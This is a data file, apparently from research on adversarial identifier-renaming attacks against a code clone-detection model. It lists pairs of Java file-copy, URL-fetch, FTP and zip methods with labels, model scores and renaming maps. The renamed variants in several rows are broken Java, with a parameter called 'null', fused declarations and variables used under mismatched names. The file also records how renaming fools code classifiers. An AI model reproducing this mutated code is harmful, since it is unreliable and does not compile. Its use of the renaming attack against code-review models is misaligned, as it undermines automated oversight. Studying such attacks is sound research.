493,"    public static void copy(File in, File out) throws IOException {
        if (in.exists() && in != null && out != null) {
            if (!out.exists()) {
                if (in.isDirectory()) {
                    out.mkdirs();
                } else {
                    out.createNewFile();
                }
            }
            String source = in.isDirectory() ? ""directory"" : ""file"";
            String target = out.isDirectory() ? ""directory"" : ""file"";
            if (!source.equals(target)) {
                throw new IOException(""Can't duplicate "" + source + "" as "" + target);
            } else {
                if (source.equals(""directory"")) {
                    File[] files = in.listFiles();
                    for (File file : files) {
                        copy(file, new File(out, file.getName()));
                    }
                } else {
                    FileChannel inCh = new FileInputStream(in).getChannel();
                    FileChannel outCh = new FileOutputStream(out).getChannel();
                    inCh.transferTo(0, inCh.size(), outCh);
                }
            }
        }
    }
 <SPLIT>     @Override
    public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
        InputStream is = null;
        InputStream page = null;
        OutputStream os = null;
        String rootUrl = null;
        try {
            boolean isMultipart = ServletFileUpload.isMultipartContent(request);
            if (!isMultipart) {
                request.setAttribute(""error"", ""Form isn't a multipart form"");
                RequestDispatcher rd = request.getRequestDispatcher(""/WEB-INF/error.jsp"");
                rd.forward(request, response);
            }
            ServletFileUpload upload = new ServletFileUpload();
            String webUrl = null;
            FileItemIterator iter = upload.getItemIterator(request);
            while (iter.hasNext()) {
                FileItemStream item = iter.next();
                String name = item.getFieldName();
                if (name.equals(""webpage"")) {
                    is = item.openStream();
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    IOUtils.copy(is, baos);
                    page = new ByteArrayInputStream(baos.toByteArray());
                } else if (name.equals(""weburl"")) {
                    InputStream wpIs = null;
                    try {
                        webUrl = Streams.asString(item.openStream());
                        URL u = new URL(webUrl);
                        wpIs = new BufferedInputStream(u.openStream());
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        IOUtils.copy(wpIs, baos);
                        page = new ByteArrayInputStream(baos.toByteArray());
                    } finally {
                        IOUtils.closeQuietly(wpIs);
                    }
                } else if (name.equals(""rooturl"")) {
                    rootUrl = Streams.asString(item.openStream());
                }
            }
            if (page == null) {
                request.setAttribute(""error"", ""Form doesn't have an html file"");
                RequestDispatcher rd = request.getRequestDispatcher(""/WEB-INF/error.jsp"");
                rd.forward(request, response);
            }
            ToMailerDelegate delegate = new ToMailerDelegate(page, rootUrl);
            os = new BufferedOutputStream(response.getOutputStream());
            os.write(delegate.getMailer());
            os.flush();
        } catch (Exception e) {
            streamException(request, response, e);
        } finally {
            IOUtils.closeQuietly(page);
            IOUtils.closeQuietly(is);
            IOUtils.closeQuietly(os);
        }
    }
",230,"    public static void rm(File url, File null) throws IOException {
        if (url.exists() && url != null && null != null) {
            if (!null.exists()) {
                if (url.isDirectory()) {
                    null.mkdirs();
                } else {
                    null.createNewFile();
                }
            }
            String ssecret= url.isDirectory() ? ""directory"" : ""letter"";
            String ttarget= null.isDirectory() ? ""directory"" : ""letter"";
            if (!secret.equals(target)) {
                throw new IOException(""Can't duplicate "" + secret + "" as "" + target);
            } else {
                if (secret.equals(""directory"")) {
                    File[] ftools= url.listFiles();
                    for (File letter : tools) {
                        rm(fletter new File(null, letter.getName()));
                    }
                } else {
                    FileChannel iinChan= new FileInputStream(url).getChannel();
                    FileChannel ooutCh= new FileOutputStream(null).getChannel();
                    inChan.transferTo(0, inChan.size(), outCh);
                }
            }
        }
    }
",LABEL_1,LABEL_1,0.5709980726242065,1,"copy,in,out,source,target,files,file,inCh,outCh",,,,5,"copy:rm,in:url,out:null,source:secret,target:target,files:tools,file:letter,inCh:inChan,outCh:outCh,",2,GA,502,0.18894007205963134,ga,[]
494,"    public void uploadFile(File inputFile, String targetFile) throws IOException {
        System.out.println(""Uploading "" + inputFile.getName() + "" to "" + targetFile);
        File outputFile = new File(targetFile);
        if (targetFile.endsWith(""/"")) {
            outputFile = new File(outputFile, inputFile.getName());
        } else if (outputFile.getParentFile().exists() == false) {
            outputFile.getParentFile().mkdirs();
        }
        if (inputFile.renameTo(outputFile) == false) {
            InputStream in = new FileInputStream(inputFile);
            OutputStream out = new FileOutputStream(outputFile);
            byte[] line = new byte[16384];
            int bytes = -1;
            while ((bytes = in.read(line)) != -1) out.write(line, 0, bytes);
            in.close();
            out.close();
        }
    }
 <SPLIT>     public void patch() throws IOException {
        if (mods.isEmpty()) {
            return;
        }
        IOUtils.copy(new FileInputStream(Paths.getMinecraftJarPath()), new FileOutputStream(new File(Paths.getMinecraftBackupPath())));
        JarFile mcjar = new JarFile(Paths.getMinecraftJarPath());
    }
",188,,LABEL_1,LABEL_1,LABEL_1,-1,"uploadFile,inputFile,targetFile,outputFile,in,out,line,bytes",,,,0,,0,GA,2981,1.0595853726069133,failed,[]
495,"    private boolean getWave(String url, String Word) {
        try {
            File FF = new File(f.getParent() + ""/"" + f.getName() + ""pron"");
            FF.mkdir();
            URL url2 = new URL(url);
            BufferedReader stream = new BufferedReader(new InputStreamReader(url2.openStream()));
            File Fdel = new File(f.getParent() + ""/"" + f.getName() + ""pron/"" + Word + "".wav"");
            if (!Fdel.exists()) {
                FileOutputStream outstream = new FileOutputStream(f.getParent() + ""/"" + f.getName() + ""pron/"" + Word + "".wav"");
                BufferedWriter bwriter = new BufferedWriter(new OutputStreamWriter(outstream));
                char[] binput = new char[1024];
                int len = stream.read(binput, 0, 1024);
                while (len > 0) {
                    bwriter.write(binput, 0, len);
                    len = stream.read(binput, 0, 1024);
                }
                bwriter.close();
                outstream.close();
            }
            stream.close();
        } catch (Exception e) {
            System.out.println(e.getMessage());
            return false;
        }
        return true;
    }
 <SPLIT>     private String getEncoding() throws IOException {
        BufferedReader reader = null;
        String encoding = null;
        try {
            URLConnection connection = url.openConnection();
            Map<String, List<String>> header = connection.getHeaderFields();
            for (Map.Entry<String, List<String>> entry : header.entrySet()) {
                if (entry.getKey().toLowerCase().equals(""content-type"")) {
                    String item = entry.getValue().toString().toLowerCase();
                    if (item.contains(""charset"")) {
                        encoding = extractEncoding(item);
                        if (encoding != null && !encoding.isEmpty()) return encoding;
                    }
                }
            }
            reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                line = line.toLowerCase();
                if (line.contains(""charset"") || line.contains(""encoding"")) {
                    encoding = extractEncoding(line);
                    if (encoding != null && !encoding.isEmpty()) return encoding;
                }
            }
            return STANDARDENCODING;
        } finally {
            if (reader != null) reader.close();
        }
    }
",266,"    private boolean getWave(String url, String Line) {
        try {
            File FF = new File(f.getParent() + ""/"" + f.getName() + ""pron"");
            FF.mkdir();
            URL pathTwo = new URL(url);
            BufferedReader strstreamnew BufferedReader(new InputStreamReader(pathTwo.openStream()));
            File Fdel = new File(f.getParent() + ""/"" + f.getName() + ""pron/"" + Line + "".wav"");
            if (!Fdel.exists()) {
                FileOutputStream outstream = new FileOutputStream(f.getParent() + ""/"" + f.getName() + ""pron/"" + Line + "".wav"");
                BufferedWriter outreader = new BufferedWriter(new OutputStreamWriter(outstream));
                char[] binput = new char[1024];
                int len = stream.read(binput, 0, 1024);
                while (len > 0) {
                    outreader.write(binput, 0, len);
                    len = stream.read(binput, 0, 1024);
                }
                outreader.close();
                outstream.close();
            }
            stream.close();
        } catch (Exception e) {
            System.out.println(e.getMessage());
            return false;
        }
        return true;
    }
",LABEL_0,LABEL_0,0.6946202516555786,1,"getWave,url,Word,FF,url2,stream,Fdel,outstream,bwriter,binput,len",,,,22,"getWave:getWave,url:url,Word:Line,FF:FF,url2:pathTwo,stream:stream,Fdel:Fdel,outstream:outstream,bwriter:outreader,binput:binput,len:len,",8,GA,490,0.18177530765533448,ga,[]
496,"    private static List<Properties> findExtensions() {
        URL url = null;
        try {
            List<Properties> extensions = new ArrayList<Properties>();
            Enumeration<URL> res = ExtensionHelper.class.getClassLoader().getResources(""logdistiller.properties"");
            while (res.hasMoreElements()) {
                url = res.nextElement();
                Properties prop = new Properties();
                prop.load(url.openStream());
                extensions.add(prop);
            }
            return extensions;
        } catch (IOException ioe) {
            String msg = (url == null) ? ""unable to list resources logdistiller.properties"" : ""unable to load resource "" + url.toExternalForm();
            throw new RuntimeException(msg, ioe);
        }
    }
 <SPLIT>     private InputStream getInputStream(String item) {
        InputStream is = null;
        URLConnection urlc = null;
        try {
            URL url = new URL(item);
            urlc = url.openConnection();
            is = urlc.getInputStream();
            current_source = url.getProtocol() + ""://"" + url.getHost() + "":"" + url.getPort() + url.getFile();
        } catch (Exception ee) {
            System.err.println(ee);
        }
        int i = 0;
        udp_port = -1;
        udp_baddress = null;
        while (urlc != null) {
            String s = urlc.getHeaderField(i);
            String t = urlc.getHeaderFieldKey(i);
            if (s == null) {
                break;
            }
            i++;
            if (""udp-port"".equals(t)) {
                try {
                    udp_port = Integer.parseInt(s);
                } catch (Exception e) {
                }
            } else if (""udp-broadcast-address"".equals(t)) {
                udp_baddress = s;
            }
        }
        return is;
    }
",141,,LABEL_0,LABEL_0,LABEL_0,-1,"findExtensions,url,extensions,res,prop,msg",,,,0,,0,GA,2270,0.8122268040974935,failed,[]
497,"    public boolean connect() {
        boolean isConnected = false;
        try {
            try {
                this.ftpClient.connect(this.server, this.port);
            } catch (SocketException e) {
                status = ErrorResult.CONNECTNOTPOSSIBLE.code;
                return false;
            } catch (IOException e) {
                status = ErrorResult.CONNECTNOTPOSSIBLE.code;
                return false;
            }
            int reply = this.ftpClient.getReplyCode();
            if (!FTPReply.isPositiveCompletion(reply)) {
                this.disconnect();
                status = ErrorResult.CONNECTNOTCORRECT.code;
                return false;
            }
            try {
                if (this.account == null) {
                    if (!this.ftpClient.login(this.username, this.passwd)) {
                        status = ErrorResult.LOGINNOTCORRECT.code;
                        this.ftpClient.logout();
                        return false;
                    }
                } else if (!this.ftpClient.login(this.username, this.passwd, this.account)) {
                    status = ErrorResult.LOGINACCTNOTCORRECT.code;
                    this.ftpClient.logout();
                    return false;
                }
            } catch (IOException e) {
                status = ErrorResult.ERRORWHILECONNECT.code;
                try {
                    this.ftpClient.logout();
                } catch (IOException e1) {
                }
                return false;
            }
            isConnected = true;
            return true;
        } finally {
            if ((!isConnected) && this.ftpClient.isConnected()) {
                this.disconnect();
            }
        }
    }
 <SPLIT>     public Bitmap retrieveBitmap(String urlString) {
        Log.d(Constants.LOG_TAG, ""making HTTP trip for image:"" + urlString);
        Bitmap bitmap = null;
        try {
            URL url = new URL(urlString);
            URLConnection conn = url.openConnection();
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(5000);
            bitmap = BitmapFactory.decodeStream(conn.getInputStream());
        } catch (MalformedURLException e) {
            Log.e(Constants.LOG_TAG, ""Exception loading image, malformed URL"", e);
        } catch (IOException e) {
            Log.e(Constants.LOG_TAG, ""Exception loading image, IO error"", e);
        }
        return bitmap;
    }
",275,,LABEL_0,LABEL_0,LABEL_0,-1,"connect,status,reply,isConnected",,,,0,,0,GA,1586,0.5764930645624796,failed,[]
498,"    public static String uncompress(String readPath, boolean mkdir) throws Exception {
        ZipArchiveInputStream arcInputStream = new ZipArchiveInputStream(new FileInputStream(readPath));
        BufferedInputStream bis = new BufferedInputStream(arcInputStream);
        File baseDir = new File(readPath).getParentFile();
        String basePath = baseDir.getPath() + ""/"";
        if (mkdir) {
            String[] schema = readPath.split(""/"");
            String baseName = schema[schema.length - 1].replaceAll("".zip"", """");
            FileUtils.forceMkdir(new File(basePath + baseName));
            basePath = basePath + baseName + ""/"";
        }
        ArchiveEntry entry;
        while ((entry = arcInputStream.getNextEntry()) != null) {
            if (entry.isDirectory()) {
                FileUtils.forceMkdir(new File(basePath + entry.getName()));
            } else {
                String writePath = basePath + entry.getName();
                String dirName = FilenameUtils.getPath(writePath);
                FileUtils.forceMkdir(new File(dirName));
                BufferedOutputStream bos = new BufferedOutputStream(FileUtils.openOutputStream(new File(writePath)));
                int i = 0;
                while ((i = bis.read()) != -1) {
                    bos.write(i);
                }
                IOUtils.closeQuietly(bos);
            }
        }
        IOUtils.closeQuietly(bis);
        return basePath;
    }
 <SPLIT>     public Set<String> getAvailableRoles() {
        if (availableRoles == null) {
            availableRoles = new HashSet<String>();
            try {
                Enumeration<URL> resources = org.springframework.util.ClassUtils.getDefaultClassLoader().getResources(ROLE_FILE_LOCATION);
                while (resources.hasMoreElements()) {
                    URL url = resources.nextElement();
                    InputStream is = null;
                    try {
                        URLConnection con = url.openConnection();
                        con.setUseCaches(false);
                        is = con.getInputStream();
                        List<String> lines = IOUtils.readLines(is, ""ISO-8859-1"");
                        if (lines != null) {
                            for (String line : lines) {
                                availableRoles.add(line.trim());
                            }
                        }
                    } finally {
                        if (is != null) {
                            is.close();
                        }
                    }
                }
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
        return availableRoles;
    }
",274,"    public static String  uncompression(String readPath, boolean kkrel) throws Exception {
        ZipArchiveInputStream arcInputStream = new ZipArchiveInputStream(new FileInputStream(readPath));
        BufferedInputStream bis = new BufferedInputStream(arcInputStream);
        File  baseDirectory = new File(readPath).getParentFile();
        String basePatfileDireDirectory.getPath() + ""/"";
        if (kkrel) {
            String[] Schemas = readPath.split(""/"");
            String babaseName Schemas[Schemas.length - 1].replaceAll("".zip"", """");
            FileUtils.forceMkdir(new File(fileDir + baseName));
            fileDir = fileDir + baseName + ""/"";
        }
        ArchiveEntry line;
        while ((line = arcInputStream.getNextEntry()) != null) {
            if (line.isDirectory()) {
                FileUtils.forceMkdir(new File(fileDir + line.getName()));
            } else {
                StrinwritingPathth = fileDir + line.getName();
                String diorderName FilenameUtils.getPath(writingPath);
                FileUtils.forceMkdir(new File(orderName));
                BufferedOutputStream bobos new BufferedOutputStream(FileUtils.openOutputStream(new File(writingPath)));
                int I = 0;
                while ((I = bis.read()) != -1) {
                    bos.write(I);
                }
                IOUtils.closeQuietly(bos);
            }
        }
        IOUtils.closeQuietly(bis);
        return fileDir;
    }
",LABEL_0,LABEL_0,0.5063286423683167,1,"uncompress,readPath,mkdir,arcInputStream,bis,baseDir,basePath,schema,baseName,entry,writePath,dirName,bos,i",,,,16,"uncompress: uncompression,readPath:readPath,mkdir:kkrel,arcInputStream:arcInputStream,bis:bis,baseDir: baseDirectory,basePath:fileDir,schema:Schemas,baseName:baseName,entry:line,writePath:writingPath,dirName:orderName,bos:bos,i:I,",5,GA,877,0.32341214418411257,ga,[]
499,"    public void doBody(JWebLiteRequestWrapper req, JWebLiteResponseWrapper resp) throws SkipException {
        BufferedInputStream bis = null;
        BufferedOutputStream bos = null;
        try {
            bis = new BufferedInputStream(new FileInputStream(this.loadData(req)));
            bos = new BufferedOutputStream(resp.getOutputStream());
            IOUtils.copy(bis, bos);
            bos.flush();
        } catch (Exception e) {
            _cat.warn(""Write data failed!"", e);
        } finally {
            IOUtils.closeQuietly(bis);
            IOUtils.closeQuietly(bos);
        }
    }
 <SPLIT>     private void compress(String outputFile, ArrayList<String> inputFiles, PrintWriter log, boolean compress) throws Exception {
        String absPath = getAppConfig().getPathConfig().getAbsoluteServerPath();
        log.println(""Concat files into: "" + outputFile);
        OutputStream out = new FileOutputStream(absPath + outputFile);
        byte[] buffer = new byte[4096];
        int readBytes;
        for (String file : inputFiles) {
            log.println("" Read: "" + file);
            InputStream in = new FileInputStream(absPath + file);
            while ((readBytes = in.read(buffer)) != -1) {
                out.write(buffer, 0, readBytes);
            }
            in.close();
        }
        out.close();
        if (compress) {
            long normalSize = new File(absPath + outputFile).length();
            ProcessBuilder builder = new ProcessBuilder(""java"", ""-jar"", ""WEB-INF/yuicompressor.jar"", outputFile, ""-o"", outputFile, ""--line-break"", ""4000"");
            builder.directory(new File(absPath));
            Process process = builder.start();
            process.waitFor();
            long minSize = new File(absPath + outputFile).length();
            long diff = normalSize - minSize;
            double percentage = Math.floor((double) diff / normalSize * 1000.0) / 10.0;
            double diffSize = (Math.floor(diff / 1024.0 * 10.0) / 10.0);
            log.println(""Result: "" + percentage + "" % ("" + diffSize + "" KB)"");
        }
    }
",107,,LABEL_1,LABEL_1,LABEL_1,-1,"doBody,req,resp,bis,bos",,,,0,,0,GA,1432,0.5211886246999105,failed,[]
